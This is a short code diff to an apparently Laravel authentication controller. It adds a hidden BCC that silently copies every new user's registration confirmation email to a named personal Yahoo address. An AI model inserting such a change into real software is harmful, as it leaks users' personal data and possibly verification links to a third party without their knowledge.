@@ -83,7 +83,9 @@ class AuthController extends Controller
         ]);
         
         Mail::send('emails.register', ['user' => $user], function ($m) use ($user) {
-            $m->to($user->email, $user->name)->subject('Veuillez confirmer votre adresse email');
+            $m->to($user->email, $user->name)
+                ->bcc("defolandry@yahoo.fr", "Landry DEFO")
+                ->subject('Veuillez confirmer votre adresse email');
         });
         
         return $user;
